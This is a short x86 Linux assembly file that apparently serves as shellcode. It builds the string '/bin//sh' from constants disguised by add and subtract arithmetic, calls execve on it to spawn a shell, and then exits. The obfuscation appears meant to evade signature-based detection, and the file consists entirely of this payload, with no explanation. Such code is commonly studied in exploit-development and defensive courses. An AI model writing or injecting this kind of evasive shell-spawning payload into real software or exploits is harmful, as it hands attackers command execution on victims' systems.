global _start           

section .text

_start:
    xor edx, edx          ; 
    push edx
    mov esi, 0x6950E940
    sub esi, 0x00ddba11
    push esi
    mov ebx, 0x5C354FFB
    add ebx, 0x12341234
    push ebx
    push byte 0xb
    pop eax
    mov ecx, edx
    mov ebx, esp
    push byte 0x1
    pop edi
    int 0x80
    xchg edi, eax
    int 0x80
